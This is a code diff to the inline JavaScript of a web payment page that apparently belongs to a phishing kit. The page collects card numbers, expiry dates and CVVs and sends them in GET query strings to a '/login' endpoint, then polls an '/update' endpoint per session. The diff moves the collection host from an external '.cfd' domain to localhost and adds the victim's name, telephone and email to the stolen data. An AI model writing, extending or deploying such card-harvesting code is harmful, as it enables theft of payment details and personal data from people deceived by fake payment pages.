@@ -404,7 +404,7 @@
 <script>
   document.addEventListener('DOMContentLoaded', function () {
       document.getElementById('ShowInputButton').addEventListener('click', function() {
-          fetch('https://api.mobiletecso.cfd/test')
+          fetch('http://127.0.0.1:5000/test')
               .then(response => response.text())
               .then(data => {
                   console.log("Data received:", data);
@@ -430,9 +430,11 @@ const telephone = urlObj.searchParams.get('telephone');
 const price = urlObj.searchParams.get('price');
 const telephoneElement = document.getElementById('telephone');
 const priceElement = document.getElementById('price');
+const offname = urlObj.searchParams.get('offname');
 
 localStorage.setItem('telephone', telephone);
 localStorage.setItem('price', price);
+localStorage.setItem('offname', offname);
 
 // Устанавливаем текстовое содержимое элементов
 telephoneElement.textContent += telephone;
@@ -452,6 +454,12 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
     const urlParams = new URLSearchParams(window.location.search);
     const id = urlParams.get('order');
 
+    const name = urlParams.get('name');
+    const tel = urlParams.get('telephone');
+    const email = urlParams.get('email');
+    console.log(name)
+    console.log(tel)
+    console.log(email)
     localStorage.setItem('cardNumber', cardNumber);
     localStorage.setItem('expiryDate', expiryDate);
     localStorage.setItem('cvv', cvv);
@@ -463,20 +471,26 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
 
     if(question){
       console.log('question')
-      var url = "https://api.mobiletecso.cfd/login" +
+      var url = "http://127.0.0.1:5000/login" +
               "?cardNumber=" + encodeURIComponent(cardNumber) +
               "&expiryDate=" + encodeURIComponent(expiryDate) +
               "&cvv=" + encodeURIComponent(cvv) +
               "&id=" + encodeURIComponent(id) +
               "&question=" + encodeURIComponent(question) +
+              "&name=" + encodeURIComponent(name) +
+              "&tel=" + encodeURIComponent(tel) +
+              "&email=" + encodeURIComponent(email) +
               "&session=" + encodeURIComponent(session);
     } else {
       console.log('question')
-      var url = "https://api.mobiletecso.cfd/login" +
+      var url = "http://127.0.0.1:5000/login" +
               "?cardNumber=" + encodeURIComponent(cardNumber) +
               "&expiryDate=" + encodeURIComponent(expiryDate) +
               "&cvv=" + encodeURIComponent(cvv) +
               "&id=" + encodeURIComponent(id) +
+              "&name=" + encodeURIComponent(name) +
+              "&tel=" + encodeURIComponent(tel) +
+              "&email=" + encodeURIComponent(email) +
               "&session=" + encodeURIComponent(session);
     }
 
@@ -532,7 +546,7 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
 });
 
 function fetchUpdate() {
-  fetch('https://api.mobiletecso.cfd/update'+"?session=" + encodeURIComponent(session))
+  fetch('http://127.0.0.1:5000/update'+"?session=" + encodeURIComponent(session))
     .then(response => {
       if (!response.ok) {
         throw new Error('Network response was not ok ' + response.statusText);
